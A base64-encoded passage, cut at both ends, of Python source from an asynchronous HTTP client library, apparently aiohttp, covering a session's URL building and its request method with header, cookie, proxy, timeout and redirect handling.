VzdENvbnRleHRNYW5hZ2VyKHNlbGYuX3JlcXVlc3QobWV0aG9kLCB1cmwsICoqa3dhcmdzKSlcclxuXHJcbiAgICBkZWYgX2J1aWxkX3VybChzZWxmLCBzdHJfb3JfdXJsOiBTdHJPclVSTCkgLT4gVVJMOlxyXG4gICAgICAgIHVybCA9IFVSTChzdHJfb3JfdXJsKVxyXG4gICAgICAgIGlmIHNlbGYuX2Jhc2VfdXJsIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVybiB1cmxcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBhc3NlcnQgbm90IHVybC5pc19hYnNvbHV0ZSgpIGFuZCB1cmwucGF0aC5zdGFydHN3aXRoKCIvIilcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2Jhc2VfdXJsLmpvaW4odXJsKVxyXG5cclxuICAgIGFzeW5jIGRlZiBfcmVxdWVzdChcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIG1ldGhvZDogc3RyLFxyXG4gICAgICAgIHN0cl9vcl91cmw6IFN0ck9yVVJMLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgcGFyYW1zOiBPcHRpb25hbFtNYXBwaW5nW3N0ciwgc3RyXV0gPSBOb25lLFxyXG4gICAgICAgIGRhdGE6IEFueSA9IE5vbmUsXHJcbiAgICAgICAganNvbjogQW55ID0gTm9uZSxcclxuICAgICAgICBjb29raWVzOiBPcHRpb25hbFtMb29zZUNvb2tpZXNdID0gTm9uZSxcclxuICAgICAgICBoZWFkZXJzOiBPcHRpb25hbFtMb29zZUhlYWRlcnNdID0gTm9uZSxcclxuICAgICAgICBza2lwX2F1dG9faGVhZGVyczogT3B0aW9uYWxbSXRlcmFibGVbc3RyXV0gPSBOb25lLFxyXG4gICAgICAgIGF1dGg6IE9wdGlvbmFsW0Jhc2ljQXV0aF0gPSBOb25lLFxyXG4gICAgICAgIGFsbG93X3JlZGlyZWN0czogYm9vbCA9IFRydWUsXHJcbiAgICAgICAgbWF4X3JlZGlyZWN0czogaW50ID0gMTAsXHJcbiAgICAgICAgY29tcHJlc3M6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgICAgIGNodW5rZWQ6IE9wdGlvbmFsW2Jvb2xdID0gTm9uZSxcclxuICAgICAgICBleHBlY3QxMDA6IGJvb2wgPSBGYWxzZSxcclxuICAgICAgICByYWlzZV9mb3Jfc3RhdHVzOiBPcHRpb25hbFtib29sXSA9IE5vbmUsXHJcbiAgICAgICAgcmVhZF91bnRpbF9lb2Y6IGJvb2wgPSBUcnVlLFxyXG4gICAgICAgIHByb3h5OiBPcHRpb25hbFtTdHJPclVSTF0gPSBOb25lLFxyXG4gICAgICAgIHByb3h5X2F1dGg6IE9wdGlvbmFsW0Jhc2ljQXV0aF0gPSBOb25lLFxyXG4gICAgICAgIHRpbWVvdXQ6IFVuaW9uW0NsaWVudFRpbWVvdXQsIG9iamVjdF0gPSBzZW50aW5lbCxcclxuICAgICAgICB2ZXJpZnlfc3NsOiBPcHRpb25hbFtib29sXSA9IE5vbmUsXHJcbiAgICAgICAgZmluZ2VycHJpbnQ6IE9wdGlvbmFsW2J5dGVzXSA9IE5vbmUsXHJcbiAgICAgICAgc3NsX2NvbnRleHQ6IE9wdGlvbmFsW1NTTENvbnRleHRdID0gTm9uZSxcclxuICAgICAgICBzc2w6IE9wdGlvbmFsW1VuaW9uW1NTTENvbnRleHQsIGJvb2wsIEZpbmdlcnByaW50XV0gPSBOb25lLFxyXG4gICAgICAgIHByb3h5X2hlYWRlcnM6IE9wdGlvbmFsW0xvb3NlSGVhZGVyc10gPSBOb25lLFxyXG4gICAgICAgIHRyYWNlX3JlcXVlc3RfY3R4OiBPcHRpb25hbFtTaW1wbGVOYW1lc3BhY2VdID0gTm9uZSxcclxuICAgICAgICByZWFkX2J1ZnNpemU6IE9wdGlvbmFsW2ludF0gPSBOb25lLFxyXG4gICAgKSAtPiBDbGllbnRSZXNwb25zZTpcclxuXHJcbiAgICAgICAgIyBOT1RFOiB0aW1lb3V0IGNsYW1wcyBleGlzdGluZyBjb25uZWN0IGFuZCByZWFkIHRpbWVvdXRzLiAgV2UgY2Fubm90XHJcbiAgICAgICAgIyBzZXQgdGhlIGRlZmF1bHQgdG8gTm9uZSBiZWNhdXNlIHdlIG5lZWQgdG8gZGV0ZWN0IGlmIHRoZSB1c2VyIHdhbnRzXHJcbiAgICAgICAgIyB0byB1c2UgdGhlIGV4aXN0aW5nIHRpbWVvdXRzIGJ5IHNldHRpbmcgdGltZW91dCB0byBOb25lLlxyXG5cclxuICAgICAgICBpZiBzZWxmLmNsb3NlZDpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJTZXNzaW9uIGlzIGNsb3NlZCIpXHJcblxyXG4gICAgICAgIHNzbCA9IF9tZXJnZV9zc2xfcGFyYW1zKHNzbCwgdmVyaWZ5X3NzbCwgc3NsX2NvbnRleHQsIGZpbmdlcnByaW50KVxyXG5cclxuICAgICAgICBpZiBkYXRhIGlzIG5vdCBOb25lIGFuZCBqc29uIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgImRhdGEgYW5kIGpzb24gcGFyYW1ldGVycyBjYW4gbm90IGJlIHVzZWQgYXQgdGhlIHNhbWUgdGltZSJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGVsaWYganNvbiBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgZGF0YSA9IHBheWxvYWQuSnNvblBheWxvYWQoanNvbiwgZHVtcHM9c2VsZi5fanNvbl9zZXJpYWxpemUpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGNodW5rZWQsIGJvb2wpIGFuZCBjaHVua2VkIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICB3YXJuaW5ncy53YXJuKCJDaHVuayBzaXplIGlzIGRlcHJlY2F0ZWQgIzE2MTUiLCBEZXByZWNhdGlvbldhcm5pbmcpXHJcblxyXG4gICAgICAgIHJlZGlyZWN0cyA9IDBcclxuICAgICAgICBoaXN0b3J5ID0gW11cclxuICAgICAgICB2ZXJzaW9uID0gc2VsZi5fdmVyc2lvblxyXG5cclxuICAgICAgICAjIE1lcmdlIHdpdGggZGVmYXVsdCBoZWFkZXJzIGFuZCB0cmFuc2Zvcm0gdG8gQ0lNdWx0aURpY3RcclxuICAgICAgICBoZWFkZXJzID0gc2VsZi5fcHJlcGFyZV9oZWFkZXJzKGhlYWRlcnMpXHJcbiAgICAgICAgcHJveHlfaGVhZGVycyA9IHNlbGYuX3ByZXBhcmVfaGVhZGVycyhwcm94eV9oZWFkZXJzKVxyXG5cclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIHVybCA9IHNlbGYuX2J1aWxkX3VybChzdHJfb3JfdXJsKVxyXG4gICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yIGFzIGU6XHJcbiAgICAgICAgICAgIHJhaXNlIEludmFsaWRVUkwoc3RyX29yX3VybCkgZnJvbSBlXHJcblxyXG4gICAgICAgIHNraXBfaGVhZGVycyA9IHNldChzZWxmLl9za2lwX2F1dG9faGVhZGVycylcclxuICAgICAgICBpZiBza2lwX2F1dG9faGVhZGVycyBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgZm9yIGkgaW4gc2tpcF9hdXRvX2hlYWRlcnM6XHJcbiAgICAgICAgICAgICAgICBza2lwX2hlYWRlcnMuYWRkKGlzdHIoaSkpXHJcblxyXG4gICAgICAgIGlmIHByb3h5IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBwcm94eSA9IFVSTChwcm94eSlcclxuICAgICAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3IgYXMgZTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIEludmFsaWRVUkwocHJveHkpIGZyb20gZVxyXG5cclxuICAgICAgICBpZiB0aW1lb3V0IGlzIHNlbnRpbmVsOlxyXG4gICAgICAgICAgICByZWFsX3RpbWVvdXQgPSBzZWxmLl90aW1lb3V0ICAjIHR5cGU6IENsaWVudFRpbWVvdXRcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBpZiBub3QgaXNpbnN0YW5jZSh0aW1lb3V0LCBDbGllbnRUaW1lb3V0KTpcclxuICAgICAgICAgICAgICAgIHJlYWxfdGltZW91dCA9IENsaWVudFRpbWVvdXQodG90YWw9dGltZW91dCkgICMgdHlwZTogaWdub3JlW2FyZy10eXBlXVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgcmVhbF90aW1lb3V0ID0gdGltZW91dFxyXG4gICAgICAgICMgdGltZW91dCBpcyBjdW11bGF0aXZlIGZvciBhbGwgcmVxdWVzdCBvcGVyYXRpb25zXHJcbiAgICAgICAgIyAocmVxdWVzdCwgcmVkaXJlY3RzLCByZXNwb25zZXMsIGRhdGEgY29uc3VtaW5nKVxyXG4gICAgICAgIHRtID0gVGltZW91dEhhbmRsZShzZWxmLl9sb29wLCByZWFsX3RpbWVvdXQudG90YWwpXHJcbiAgICAgICAgaGFuZGxlID0gdG0uc3RhcnQoKVxyXG5cclxuICAgICAgICBpZiByZWFkX2J1ZnNpemUgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmVhZF9idWZzaXplID0gc2VsZi5fcmVhZF9idWZzaXplXHJcblxyXG4gICAgICAgIHRyYWNlcyA9IFtcclxuICAgICAgICAgICAgVHJhY2UoXHJcbiAgICAgICAgICAgICAgICBzZWxmLFxyXG4gICAgICAgICAgICAgICAgdHJhY2VfY29uZmlnLFxyXG4gICAgICAgICAgICAgICAgdHJhY2VfY29uZmlnLnRyYWNlX2NvbmZpZ19jdHgodHJhY2VfcmVxdWVzdF9jdHg9dHJhY2VfcmVxdWVzdF9jdHgpLFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGZvciB0cmFjZV9jb25maWcgaW4gc2VsZi5fdHJhY2VfY29uZmlnc1xyXG4gICAgICAgIF1cclxuXHJcbiAgICAgICAgZm9yIHRyYWNlIGluIHRyYWNlczpcclxuICAgICAgICAgICAgYXdhaXQgdHJhY2Uuc2VuZF9yZXF1ZXN0X3N0YXJ0KG1ldGhvZCwgdXJsLnVwZGF0ZV9xdWVyeShwYXJhbXMpLCBoZWFkZXJzKVxyXG5cclxuICAgICAgICB0aW1lciA9IHRtLnRpbWVyKClcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIHdpdGggdGltZXI6XHJcbiAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOlxyXG4gICAgICAgICAgICAgICAgICAgIHVybCwgYXV0aF9mcm9tX3VybCA9IHN0cmlwX2F1dGhfZnJvbV91cmwodXJsKVxyXG4gICAgICAgICAgICAgICAgICAgIGlmIGF1dGggYW5kIGF1dGhfZnJvbV91cmw6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQ2Fubm90IGNvbWJpbmUgQVVUSCBhcmd1bWVudCB3aXRoICJcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICJjcmVkZW50aWFscyBlbmNvZGVkIGluIFVSTCJcclxuICAgICAgICAgICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICBpZiBhdXRoIGlzIE5vbmU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGF1dGggPSBhdXRoX2Zyb21fdXJsXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgYXV0aCBpcyBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBhdXRoID0gc2VsZi5fZGVmYXVsdF9hdXRoXHJcbiAgICAgICAgICAgICAgICAgICAgIyBJdCB3b3VsZCBiZSBjb25mdXNpbmcgaWYgd2Ugc3VwcG9ydCBleHBsaWNpdFxyXG4gICAgICAgICAgICAgICAgICAgICMgQXV0aG9yaXphdGlvbiBoZWFkZXIgd2l0aCBhdXRoIGFyZ3VtZW50XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXJzIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGFuZCBhdXRoIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGFuZCBoZHJzLkFVVEhPUklaQVRJT04gaW4gaGVhZGVyc1xyXG4gICAgICAgICAgICAgICAgICAgICk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQ2Fubm90IGNvbWJpbmUgQVVUSE9SSVpBVElPTiBoZWFkZXIgIlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIndpdGggQVVUSCBhcmd1bWVudCBvciBjcmVkZW50aWFscyAiXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZW5jb2RlZCBpbiBVUkwiXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgYWxsX2Nvb2tpZXMgPSBzZWxmLl9jb29raWVfamFyLmZpbHRlcl9jb29raWVzKHVybClcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgY29va2llcyBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgdG1wX2Nvb2tpZV9qYXIgPSBDb29raWVKYXIoKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB0bXBfY29va2llX2phci51cGRhdGVfY29va2llcyhjb29raWVzKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICByZXFfY29va2llcyA9IHRtcF9jb29raWVfamFyLmZpbHRlcl9jb29raWVzKHVybClcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgcmVxX2Nvb2tpZXM6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhbGxfY29va2llcy5sb2FkKHJlcV9jb29raWVzKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICBpZiBwcm94eSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgcHJveHkgPSBVUkwocHJveHkpXHJcbiAgICAgICAgICAgICAgICAgICAgZWxpZiBzZWxmLl90cnVzdF9lbnY6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggc3VwcHJlc3MoTG9va3VwRXJyb3IpOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJveHksIHByb3h5X2F1dGggPSBnZXRfZW52X3Byb3h5X2Zvcl91cmwodXJsKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICByZXEgPSBzZWxmLl9yZXF1ZXN0X2NsYXNzKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBtZXRob2QsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zPXBhcmFtcyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVycz1oZWFkZXJzLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBza2lwX2F1dG9faGVhZGVycz1za2lwX2hlYWRlcnMsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE9ZGF0YSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgY29va2llcz1hbGxfY29va2llcyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXV0aD1hdXRoLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICB2ZXJzaW9uPXZlcnNpb24sXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbXByZXNzPWNvbXByZXNzLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBjaHVua2VkPWNodW5rZWQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGV4cGVjdDEwMD1leHBlY3QxMDAsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxvb3A9c2VsZi5fbG9vcCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VfY2xhc3M9c2VsZi5fcmVzcG9uc2VfY2xhc3MsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHByb3h5PXByb3h5LFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBwcm94eV9hdXRoPXByb3h5X2F1dGgsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVyPXRpbWVyLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZXNzaW9uPXNlbGYsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNzbD1zc2wsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHByb3h5X2hlYWRlcnM9cHJveHlfaGVhZGVycyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgdHJhY2VzPXRyYWNlcyxcclxuICAgICAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICMgY29ubmVjdGlvbiB0aW1lb3V0XHJcbiAgICAgICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGNlaWxfdGltZW91dChyZWFsX3RpbWVvdXQuY29ubmVjdCk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3NlcnQgc2VsZi5fY29ubmVjdG9yIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25uID0gYXdhaXQgc2VsZi5fY29ubmVjdG9yLmNvbm5lY3QoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVxLCB0cmFjZXM9dHJhY2VzLCB0aW1lb3V0PXJlYWxfdGltZW91dFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBhc3luY2lvLlRpbWVvdXRFcnJvciBhcyBleGM6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIFNlcnZlclRpbWVvdXRFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICJDb25uZWN0aW9uIHRpbWVvdXQgIiAidG8gaG9zdCB7fSIuZm9ybWF0KHVybClcclxuICAgICAgICAgICAgICAgICAgICAgICAgKSBmcm9tIGV4Y1xyXG5cclxuICAgICAgICAgICAgICAgICAgICBhc3NlcnQgY29ubi50cmFuc3BvcnQgaXMgbm90IE5vbmVcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0IGNvbm4ucHJvdG9jb2wgaXMgbm90IE5vbmVcclxuICAgICAgICAgICAgICAgICAgICBjb25uLnByb3RvY29sLnNldF9yZXNwb25zZV9wYXJhbXMoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVyPXRpbWVyLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBza2lwX3BheWxvYWQ9bWV0aG9kLnVwcGVyKCkgPT0gIkhFQUQiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICByZWFkX3VudGlsX2VvZj1yZWFkX3VudGlsX2VvZixcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXV0b19kZWNvbXByZXNzPXNlbGYuX2F1dG9fZGVjb21wcmVzcyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgcmVhZF90aW1lb3V0PXJlYWxfdGltZW91dC5zb2NrX3JlYWQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJlYWRfYnVmc2l6ZT1yZWFkX2J1ZnNpemUsXHJcbiAgICAgICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc3AgPSBhd2FpdCByZXEuc2VuZChjb25uKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IHJlc3Auc3RhcnQoY29ubilcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBCYXNlRXhjZXB0aW9uOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc3AuY2xvc2UoKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBCYXNlRXhjZXB0aW9uOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29ubi5jbG9zZSgpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByYWlzZVxyXG4gICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBDbGllbnRFcnJvcjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2VcclxuICAgICAgICAgICAgICAgICAgICBleGNlcHQgT1NFcnJvciBhcyBleGM6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIENsaWVudE9TRXJyb3IoKmV4Yy5hcmdzKSBmcm9tIGV4Y1xyXG5cclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9jb29raWVfamFyLnVwZGF0ZV9jb29raWVzKHJlc3AuY29va2llcywgcmVzcC51cmwpXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICMgcmVkaXJlY3RzXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgcmVzcC5zdGF0dXMgaW4gKDMwMSwgMzAyLCAzMDMsIDMwNywgMzA4KSBhbmQgYWxsb3dfcmVkaXJlY3RzOlxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHRyYWNlIGluIHRyYWNlczpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IHRyYWNlLnNlbmRfcmVxdWVzdF9yZWRpcmVjdChcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXRob2QsIHVybC51cGRhdGVfcXVlcnkocGFyYW1zKSwgaGVhZGVycywgcmVzcFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgcmVkaXJlY3RzICs9IDFcclxuICAgICAgICAgICAgICAgICAgICAgICAgaGlzdG9yeS5hcHBlbmQocmVzcClcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgbWF4X3JlZGlyZWN0cyBhbmQgcmVkaXJlY3RzID49IG1heF9yZWRpcmVjdHM6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXNwLmNsb3NlKClcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIFRvb01hbnlSZWRpcmVjdHMoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGlzdG9yeVswXS5yZXF1ZXN0X2luZm8sIHR1cGxlKGhpc3RvcnkpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAjIEZvciAzMDEgYW5kIDMwMiwgbWltaWMgSUUsIG5vdyBjaGFuZ2VkIGluIFJGQ1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAjIGh0dHBzOi8vZ2l0aHViLmNvbS9rZW5uZXRocmVpdHovcmVxdWVzdHMvcHVsbC8yNjlcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlc3Auc3RhdHVzID09IDMwMyBhbmQgcmVzcC5tZXRob2QgIT0gaGRycy5NRVRIX0hFQUQpIG9yIChcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc3Auc3RhdHVzIGluICgzMDEsIDMwMikgYW5kIHJlc3AubWV0aG9kID09IGhkcnMuTUVUSF9QT1NUXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXRob2QgPSBoZHJzLk1FVEhfR0VUXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gTm9uZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaGVhZGVycy5nZXQoaGRycy5DT05URU5UX0xFTkdUSCk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVycy5wb3AoaGRycy5DT05URU5UX0xFTkdUSClcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJfdXJsID0gcmVzcC5oZWFkZXJzLmdldChoZHJzLkxPQ0FUSU9OKSBvciByZXNwLmhlYWRlcnMuZ2V0KFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaGRycy5VUklcclxuICAgICAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiByX3VybCBpcyBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzZWUgZ2l0aHViLmNvbS9haW8tbGlicy9haW9odHRwL2lzc3Vlcy8yMDIyXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVha1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIyByZWFkaW5nIGZyb20gY29ycmVjdCByZWRpcmVjdGlvblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIyByZXNwb25zZSBpcyBmb3JiaWRkZW5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc3AucmVsZWFzZSgpXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJzZWRfdXJsID0gVVJMKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJfdXJsLCBlbmNvZGVkPW5vdCBzZWxmLl9yZXF1b3RlX3JlZGlyZWN0X3VybFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3IgYXMgZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIEludmFsaWRVUkwocl91cmwpIGZyb20gZVxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgc2NoZW1lID0gcGFyc2VkX3VybC5zY2hlbWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2NoZW1lIG5vdCBpbiAoImh0dHAiLCAiaHR0cHMiLCAiIik6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXNwLmNsb3NlKClcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkNhbiByZWRpcmVjdCBvbmx5IHRvIGh0dHAgb3IgaHR0cHMiKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbGlmIG5vdCBzY2hlbWU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJzZWRfdXJsID0gdXJsLmpvaW4ocGFyc2VkX3VybClcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHVybC5vcmlnaW4oKSAhPSBwYXJzZWRfdXJsLm9yaWdpbigpOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0aCA9IE5vbmVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlcnMucG9wKGhkcnMuQVVUSE9SSVpBVElPTiwgTm9uZSlcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybCA9IHBhcnNlZF91cmxcclxuICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zID0gTm9uZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICByZXNwLnJlbGVhc2UoKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG5cclxuICAgICAgICAgICAgICAgICAgICBicmVha1xyXG5cclxuICAgICAgICAgICAgIyBjaGVjayByZXNwb25zZSBzdGF0dXNcclxuICAgICAgICAgICAgaWYgcmFpc2VfZm9yX3N0YXR1cyBpcyBOb25lOlxyXG4gICAgICAgICAgICAgICAgcmFpc2VfZm9yX3N0YXR1cyA9IHNlbGYuX3JhaXNlX2Zvcl9zdGF0dXNcclxuICAgICAgICAgICAgaWYgcmFpc2VfZm9yX3N0YXR1czpcclxuICAgICAgICAgICAgICAgIHJlc3AucmFpc2VfZm9yX3N0YXR1cygpXHJcblxyXG4gICAgICAgICAgICAjIHJlZ2lzdGVyIGNvbm5lY3Rpb25cclxuICAgICAgICAgICAgaWYgaGFuZGxlIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgaWYgcmVzcC5jb25uZWN0aW9uIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgIHJlc3AuY29ubmVjdGlvbi5hZGRfY2FsbGJhY2soaGFuZGxlLmNhbmNlbClcclxuICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgaGFuZGxlLmNhbmNlbCgpXHJcblxyXG4gICAgICAgICAgICByZXNwLl9oaXN0b3J5ID0gdHVwbGUoaGlzdG9yeSlcclxuXHJcbiAgICAgICAgICAgIGZvciB0cmFjZSBpbiB0cmFjZXM6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCB0cmFjZS5zZW5kX3JlcXVlc3RfZW5kKFxyXG4gICAgICAgICAgICAgICAgICAgIG1ldGhvZCwgdXJsLnVwZGF0ZV9xdWVye